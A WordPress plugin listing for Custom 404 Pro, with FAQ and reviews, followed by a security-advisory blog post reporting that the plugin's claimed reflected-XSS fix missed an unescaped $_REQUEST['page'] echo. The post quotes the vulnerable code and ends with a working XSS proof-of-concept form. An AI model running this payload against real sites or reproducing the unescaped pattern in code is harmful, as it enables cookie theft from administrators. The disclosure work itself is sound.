## Description

Allows users to replace the default 404 page with a custom page from the Pages section in the Admin Panel. Or you can specify a complete URL to redirect on 404.

#### Important Note

#### Features

* Full 404 Page Control
* Record 404 Page Data
* Custom Page Redirect
* Custom URL Redirect

#### How does it work?

* WordPress Page: Choose a custom page from the Admin Panel
* URL: Enter a custom URL for 404
* Stats: List of all 404s

## Installation

* Extract the downloaded ZIP file.
* Copy the custom-404-pro folder to the wp-content/plugins directory.
* Activate from the Plugins Section.

## FAQ

### Why is the 404 custom redirect not working?

Some users have reported an issue with the Divi theme where the 404 redirect does not work. In such cases, please disable the Divi theme and try again. It’s usually a good practice to start disabling themes/plugins one by one and work your way backward to see what might be causing the issue.

### Why are my plugin preferences not being saved?

Uninstall the plugin from the Plugins page (important!) and reinstall it. Never remove plugin folders directly from your WordPress installation as this DOES NOT cleanup plugin database tables.

Thank you so much for this brilliant plugin. I am not technically confident, cannot do much by way of coding and get overwhelmed with geek speak. I downloaded this plugin after trying (and failing with) another, and within 10 minutes had my custom 404 page up and running. This has saved me time, energy and stress. Thank you so much. I have just donated something small too to support you in your work and creativity.

На мой взгляд, это лучшее и простое дополнение для перенаправления!
Перенаправляет даже с «закрытой страницы» ?author=1 что другие подобные дополнения делать не могут.
Молодец.

This plugin was working great for us until we adjust the settings to start logging the 404 pages. Then, the custom page we selected in Wordpress for the 404 to route to stops working. Is this a known bug?

# Other Vulnerability Data Sources Miss That a Reflected XSS Vulnerability in Custom 404 Pro Hasn’t Been Fixed

Being warned about vulnerabilities in WordPress plugins you use isn’t much good if you are being told that vulnerabilities have been fixed when it hasn’t. That is often a problem with data sources on vulnerabilities in WordPress plugins other than the one what underlies [our service](https://www.pluginvulnerabilities.com/product/subscription/).

Yesterday an update to the plugin [Custom 404 Pro](https://wordpress.org/plugins/custom-404-pro/) had the changelog entry “Fix Reflected XSS”. In looking to see if the discoverer of that had put a report we found multiple places reporting that a vulnerability had been fixed.

Here is the WPScan Vulnerability Database:

[![](https://www.pluginvulnerabilities.com/wp-content/uploads/2019/06/wpscan-vulnerability-database.png)](https://www.pluginvulnerabilities.com/wp-content/uploads/2019/06/wpscan-vulnerability-database.png)

Here is NinTechNet:

[![](https://www.pluginvulnerabilities.com/wp-content/uploads/2019/06/nintechnet.png)](https://www.pluginvulnerabilities.com/wp-content/uploads/2019/06/nintechnet.png)

Here is Cybersecurity Help:

[![](https://www.pluginvulnerabilities.com/wp-content/uploads/2019/06/cybsersecurity-help.png)](https://www.pluginvulnerabilities.com/wp-content/uploads/2019/06/cybsersecurity-help.png)

The problem is that the current version is still vulnerable, as we found when we starting checking over this to see if there was a vulnerability we should add to our data set.

The change made in the version they claimed fixed this was to change this line in the file /admin/views/logs.php:

| ``` 21  ``` | ``` echo $_GET['s']; ``` |
| --- | --- |

echo $\_GET['s'];

to this:

| ``` 21  ``` | ``` echo esc_html($_GET['s']); ``` |
| --- | --- |

echo esc\_html($\_GET['s']);

Previously the code output user input without escaping it, which possibly leads to reflected cross-site scripting (XSS), and it was change to escape it.

If you actually look at the code around that to determine if that was exploitable, as we do when adding vulnerabilities to our data set, what you see is that that isn’t the only line of code in that file where that occurs:

| ``` 14  ``` | ``` <input type="hidden" name="page" value="<?php echo $_REQUEST['page']; ?>" /> ``` |
| --- | --- |

<input type="hidden" name="page" value="<?php echo $\_REQUEST['page']; ?>" />

That line wasn’t fixed in the new version.

That file is loaded when the function page\_logs() runs:

| ``` 18 19 20  ``` | ``` public function page_logs() { 	include 'views/logs.php'; } ``` |
| --- | --- |

public function page\_logs() {
include 'views/logs.php';
}

That function is run when accessing the plugin’s main admin page, which is normally only accessible to Administrators:

| ``` 10  ``` | ``` add_menu_page( 'Custom 404 Pro', 'Custom 404 Pro', 'manage_options', 'c4p-main', array( $this, 'page_logs' ), 'dashicons-chart-bar' ); ``` |
| --- | --- |

add\_menu\_page( 'Custom 404 Pro', 'Custom 404 Pro', 'manage\_options', 'c4p-main', array( $this, 'page\_logs' ), 'dashicons-chart-bar' );

## Wrong Versions

Cybersecurity Help go further than the others is listing what versions are supposedly are vulnerable:

[![](https://www.pluginvulnerabilities.com/wp-content/uploads/2019/06/cybsersecurity-help-versions.png)](https://www.pluginvulnerabilities.com/wp-content/uploads/2019/06/cybsersecurity-help-versions.png)

That isn’t accurate as they list all of the previous version of the plugin as being vulnerable, despite the vulnerability having not existed in all of the versions.

## Full Disclosure

Due to the moderators of the WordPress Support Forum’s [continued inappropriate behavior](https://www.pluginvulnerabilities.com/2019/05/17/wordpress-support-forum-moderator-jan-dembowski-gets-in-the-way-of-people-dealing-with-hacks-due-to-wp-live-chat-support/) we are [full disclosing vulnerabilities in protest until WordPress gets that situation cleaned up](https://www.pluginvulnerabilities.com/2018/09/25/our-new-disclosure-policy-in-response-to-the-continued-inappropriate-behavior-of-the-wordpress-support-forum-moderators/), so we are releasing this post and then leaving a message about that for the developer through the WordPress Support Forum. You can notify the developer of this issue on the forum as well. Hopefully the moderators will finally see the light and clean up their act soon, so these full disclosures will no longer be needed (we hope they end soon). You would think they would have already done that, but considering that they believe that having plugins, which have millions installs, remain in the Plugin Directory [despite them knowing they are vulnerable is “appropriate action”](https://www.pluginvulnerabilities.com/2019/04/22/wordpress-believes-that-leaving-millions-of-installs-of-plugins-vulnerable-to-publicly-known-vulnerabilities-is-appropriate-action/), something is very amiss with them (which is even more reason the moderation needs to be cleaned up).

**Update:**To clear up the confusion where developers claim we hadn’t tried to notify them through the Support Forum (while at the same time moderators are complaining about us doing just that), here is the message we left for this vulnerability:

## Is It Fixed?

If you are reading this post down the road the best way to find out if this vulnerability or other WordPress plugin vulnerabilities in plugins you use have been fixed is to sign up for [our service](https://www.pluginvulnerabilities.com/product/subscription/), since what we uniquely do when it comes to that type of data is to test to see if vulnerabilities have really been fixed. Relying on the developer’s information, can lead you astray, as we often find that they believe they have fixed vulnerabilities, but have failed to do that.

## Proof of Concept

The following proof of concept will cause any available cookies to be shown in an alert box, when logged in as an Administrator. Major web browsers other than Firefox provide XSS filtering, so this proof of concept will not work in those web browsers.

Make sure to replace “[path to WordPress]” with the location of WordPress.

```
<html>
<body>
<form action="http://[path to WordPress]/wp-admin/admin.php?page=c4p-main" method="POST">
<input type="hidden" name="page" value='"><script>alert(document.cookie);</script>' />
<input type="submit" value="Submit" />
</form>
</body>
</html>
```
